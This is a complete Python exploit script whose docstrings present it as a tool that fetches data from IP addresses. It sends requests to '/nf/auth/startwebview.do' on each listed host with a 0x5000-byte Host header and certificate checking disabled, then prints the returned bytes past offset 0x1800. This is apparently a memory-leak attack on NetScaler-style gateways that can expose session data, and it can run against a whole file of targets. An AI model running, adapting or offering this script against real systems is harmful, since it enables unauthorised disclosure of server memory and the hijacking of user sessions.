import requests
import argparse
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_all_ips_from_file(file_path):
    """
    Reads all valid IP addresses from a text file and returns them as a list.
    Prints each IP address being processed.
    """
    ips = []
    with open(file_path, 'r') as f:
        for line in f:
            ip = line.strip()
            if ip:
                ips.append(ip)
    return ips

def main(ip=None, file_path=None):
    """
    Main function to fetch the data from multiple IP addresses.
    Supports reading IPs from the command line or a text file.
    """
    # If a single IP is provided, wrap it in a list for uniform processing
    ip_list = [ip] if ip else []

    # If a file path is provided, add all IPs from the file to the list
    if file_path:
        ip_list.extend(read_all_ips_from_file(file_path))

    # Validate that at least one IP address is available for processing
    if not ip_list:
        print("No valid IP addresses provided. Please provide an IP address via command line or file.")
        return

    # Process each IP address in the list
    for current_ip in ip_list:
        url = f"https://{current_ip}/nf/auth/startwebview.do"
        try:
            print(f"\nAttempting request for IP: {current_ip}")
            r = requests.get(url, headers={"Host": "A" * 0x5000}, verify=False)
            print(r.content[0x1800:])
        except requests.ConnectionError:
            print(f"Connection error occurred for IP: {current_ip}. Skipping to the next.")
        except Exception as e:
            print(f"Error occurred for IP {current_ip}: {e}. Skipping to the next.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Fetch data from specified IP addresses.')
    parser.add_argument('--ip', type=str, help='The IP address to use in the URL.')
    parser.add_argument('--file', type=str, help='A text file containing IP addresses.')

    args = parser.parse_args()
    main(ip=args.ip, file_path=args.file)
